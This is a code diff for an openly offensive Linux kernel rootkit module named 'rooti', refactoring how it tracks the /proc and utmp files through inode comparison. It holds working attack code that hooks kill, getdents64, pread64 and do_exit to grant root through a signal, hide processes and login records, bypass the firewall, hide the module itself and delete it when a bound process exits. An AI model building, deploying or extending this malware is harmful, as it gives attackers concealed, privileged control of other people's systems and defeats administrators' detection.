@@ -5,6 +5,7 @@
 #include <linux/string.h>
 #include <linux/uaccess.h>
 #include <linux/dirent.h>
+#include <linux/namei.h>
 #include <linux/threads.h>
 #include <linux/file.h>
 #include <linux/filter.h>
@@ -19,8 +20,7 @@
 #include "capabilities/hiding/module.h"
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
-#include "capabilities/tracking/process.h"
-#include "capabilities/tracking/fd.h"
+#include "state.h"
 #include "utils.h"
 #include "config.h"
 
@@ -38,24 +38,11 @@ enum rooti_signal {
     ROOTI_SIG_PROC_PE = 64                // request for privilege escalation
 };
 
-// List of tracked processes (for each one we track different attributes)
-static LIST_HEAD(rooti_tracked_procs);
-
-// List of /proc directory FDs opened by userspace processes
-static LIST_HEAD(rooti_proc_tracked_fds);
-
-// List of FDs of /var/run/utmp opened by userspace processes
-static LIST_HEAD(rooti_utmp_tracked_fds);
-
-struct list_head *rooti_tracked_fds_lists[] = {
-    &rooti_proc_tracked_fds,
-    &rooti_utmp_tracked_fds
-};
+struct inode *utmp_inode;
+struct inode *proc_inode;
 
 // References to the original syscall handlers which we are hooking
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
-static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
-static asmlinkage long (*orig_close)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
@@ -77,101 +64,67 @@ static asmlinkage long hook_kill(const struct pt_regs *regs)
     case ROOTI_SIG_PROC_PE:
         return rooti_elevate_privilege();
     case ROOTI_SIG_PROC_HIDE:
-        return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+        return rooti_pid_list_add(current->pid, &rooti_hidden_pids);
     case ROOTI_SIG_PROC_UNHIDE:
-        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
+        rooti_pid_list_del(current->pid, &rooti_hidden_pids);
         return 0;
     case ROOTI_SIG_PROC_LIFETIME_BIND:
-        return rooti_track_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+        return rooti_pid_list_add(current->pid, &rooti_lifetime_bound_pids);
     case ROOTI_SIG_PROC_LIFETIME_UNBIND:
-        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_LIFETIME_BOUND, &rooti_tracked_procs);
+        rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
         return 0;
     default:
         return orig_kill(regs);
     }
 }
 
-static asmlinkage long hook_openat(const struct pt_regs *regs)
-{
-    // Allocate a kernel buffer to store the requested filename + null terminator
-    char *filepath_user = (char *)regs->si;
-    char *filepath_kernel = kmalloc(PATH_MAX, GFP_KERNEL);
-    if (filepath_kernel == NULL) {
-        ROOTI_DEBUG("failed to allocate memory");
-        return orig_openat(regs);
-    }
-
-    // Copy the requested filename to the kernel mode buffer
-    int len = strncpy_from_user(filepath_kernel, filepath_user, PATH_MAX - 1);
-    if (len < 0) {
-        ROOTI_DEBUG("strncpy_from_user() failed: %d", len);
-        kfree(filepath_kernel);
-        return orig_openat(regs);
-    }
-    filepath_kernel[PATH_MAX - 1] = '\0';
-
-    // Invoke the original syscall
-    int fd = orig_openat(regs);
-    int err;
-    
-    // Check if the requested file to open is the /proc VFS directory
-    if (strncmp(filepath_kernel, "/proc", PATH_MAX) == 0) {
-        err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
-    }
-    // Check if the requested file to open is the utmp file storing login records
-    else if (strncmp(filepath_kernel, "/var/run/utmp", PATH_MAX) == 0) {
-        err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
-    }
-
-    kfree(filepath_kernel);
-    return fd;
-}
-
-static asmlinkage long hook_close(const struct pt_regs *regs)
-{
-    int fd = regs->di;
-    struct rooti_tracked_fd *record;
-
-    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        // Search for a tracking of this FD and if found, remove it
-        record = rooti_search_tracked_fd(fd, rooti_tracked_fds_lists[i]);
-        if (record != NULL) {
-            rooti_untrack_fd(record);
-        }
-    }
-    return orig_close(regs);
-}
-
 static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     int fd = regs->di;
     char *user_buf = (char *)regs->si;
     size_t count = regs->dx;
+    struct file *file;
     
     // Invoke the original syscall
     size_t nread = orig_pread64(regs);
+    if (nread < 0)
+        return nread;
 
-    // Is this a read of /var/utmp?
-    if (rooti_is_tracked_fd(fd, &rooti_utmp_tracked_fds)) {
-        rooti_hide_login_entry(user_buf, count);
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
+        return nread;
     }
+
+    if (file->f_inode == utmp_inode)
+        rooti_hide_login_entry(user_buf, count);
+
+    fput(file);
     return nread;
 }
 
 static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 {
-    // Invoke the original syscall
-    int fd  = regs->di;
+    int fd = regs->di;
     struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
+    struct file *file;
+    int ret;
+
+    // Invoke the original syscall
     int nread = orig_getdents64(regs);
-    if (nread < 0) {
+    if (nread < 0)
+        return nread;
+
+    file = fget(fd);
+    if (file == NULL) {
+        ROOTI_DEBUG("fget() failed");
         return nread;
     }
 
-    // Check if the directory FD is of /proc
-    bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
-
     // Filter any files we wish to hide from the buffer
-    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, &rooti_tracked_procs);
+    ret = rooti_hide_dir_entries(user_buf, nread, file->f_inode == proc_inode);
+
+    fput(file);
+    return ret;
 }
 
 static asmlinkage long hook_socket(const struct pt_regs *regs)
@@ -264,20 +217,13 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
 
 static void hook_do_exit(long code)
 {
-    struct rooti_tracked_proc *proc = rooti_search_tracked_proc(current->pid, &rooti_tracked_procs);
-    bool should_unload = false;
+    bool should_unload = rooti_pid_list_contains(current->pid, &rooti_lifetime_bound_pids);
+    rooti_pid_list_del(current->pid, &rooti_hidden_pids);
+    rooti_pid_list_del(current->pid, &rooti_lifetime_bound_pids);
 
-    if (proc == NULL) orig_do_exit(code);
-    
-    // If bound to the lifetime of the current process, the module should unload itself
-    if (test_bit(ROOTI_PROC_LIFETIME_BOUND, &proc->attrs)) {
-        should_unload = true;
-    }
-    rooti_untrack_proc(proc);
-
-    if (should_unload) {
+    if (should_unload)
         rooti_schedule_self_deletion();
-    }
+
     orig_do_exit(code);
 }
 
@@ -308,8 +254,6 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
  * messes with system calls that are used by the common Linux utils (ls, ps, ss, who...) */
 struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
-    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
@@ -324,20 +268,29 @@ struct rooti_func_hook func_hooks[] = {
 // LKM initialization
 static int __init rooti_init(void)
 {
+    int err;
+    struct path path;
+
     ROOTI_DEBUG("init");
 
+    kern_path("/var/run/utmp", LOOKUP_FOLLOW, &path);
+    utmp_inode = path.dentry->d_inode;
+
+    kern_path("/proc", LOOKUP_FOLLOW, &path);
+    proc_inode = path.dentry->d_inode;
+
     // Resolves the address of kallsyms_lookup_name for later use
-    int ret = rooti_resolve_kln_addr();
-    if (ret < 0) {
-        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", ret);
-        return ret;
+    err = rooti_resolve_kln_addr();
+    if (err) {
+        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", err);
+        return err;
     }
 
     // Install function hooks :D
-    ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
-    if (ret < 0) {
-        ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
-        return ret;
+    err = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
+    if (err) {
+        ROOTI_DEBUG("rooti_install_hooks() failed: %d", err);
+        return err;
     }
 
     // Install firewall bypass hooks
@@ -345,9 +298,9 @@ static int __init rooti_init(void)
 
     // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
-    ret = rooti_hideme();
-    if (ret < 0)
-        return ret;
+    err = rooti_hideme();
+    if (err)
+        return err;
 #endif
 
     return 0;
@@ -364,10 +317,8 @@ static void __exit rooti_exit(void)
     rooti_uninstall_fw_bypass_hooks();
     
     // Release any remaining records
-    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
-        rooti_clear_fd_tracking(rooti_tracked_fds_lists[i]);
-    }
-    rooti_clear_proc_tracking(&rooti_tracked_procs);
+    rooti_pid_list_clear(&rooti_hidden_pids);
+    rooti_pid_list_clear(&rooti_lifetime_bound_pids);
 }
 
 module_init(rooti_init);
